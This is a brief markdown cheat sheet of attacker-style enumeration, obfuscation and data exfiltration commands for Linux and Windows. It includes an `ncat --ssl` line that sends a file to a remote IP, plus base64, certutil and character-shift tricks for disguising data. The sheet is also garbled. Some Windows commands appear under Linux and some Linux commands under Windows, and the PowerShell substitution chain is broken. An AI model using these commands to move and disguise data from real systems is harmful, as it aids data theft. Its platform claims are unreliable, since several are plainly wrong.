# Linux
- User Enumeration
  - `net user`
- Process Enum:
  - `ps -elf`
  - `top` or `htop` (if available)
- Service Enumeration:
  - `systemctl --type=service` (SystemD)
  - `chkconfig` (SysV systems)
- Network Enumeration:
  - `ip addr`
  - `ifconfig -a` (deprecated)
- Data Exfiltration
  - `ssh <user>@<host> | tee`
- Obfuscation
```
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64
```
- Encrypted Transport
```
scp <source> <destination>
ncat --ssl <ip> <port> < <file>
```
# Windows
- User Enumeration
  - `w` (active users)
  - `cat /etc/passwd` (all users)
- Process Enumeration:
  - `tasklist /v`
- Service Enumeration:
  - `tasklist /svc`
- Network Enumeration:
  - `ipconfig /all`
- Obfuscation:
```
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
```
